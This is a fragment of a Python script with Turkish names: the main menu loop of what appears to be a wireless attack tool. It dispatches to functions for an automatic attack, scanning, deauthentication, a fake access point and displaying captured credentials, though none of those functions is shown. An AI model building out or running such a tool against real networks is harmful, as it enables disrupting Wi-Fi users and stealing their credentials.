    if not otomatik_arayuz_baslat():
        print(f"\n{Renkler.KIRMIZI}[!] kablosuz arayüz başlatılamadı. çıkılıyor.{Renkler.SIFIRLA}")
        temizlik_yap()
        return

    # menü döngüsü
    while True:
        try:
            ana_menu()
            secim = kullanici_girdisi("seçiminiz")

            if secim == '1':
                otomatik_saldiri()
            elif secim == '2':
                sadece_tarama()
            elif secim == '3':
                sadece_deauth()
            elif secim == '4':
                sadece_sahte_ap()
            elif secim == '5':
                yakalanan_bilgileri_goster()
            elif secim == '0':
                print(f"\n{Renkler.YESIL}[✓] güle güle!{Renkler.SIFIRLA}\n")
                temizlik_yap()
                break
            else:
                print(f"{Renkler.KIRMIZI}[!] geçersiz seçim.{Renkler.SIFIRLA}")

        except KeyboardInterrupt:
            print()
            temizlik_yap()
            break


if __name__ == '__main__':
    ana()
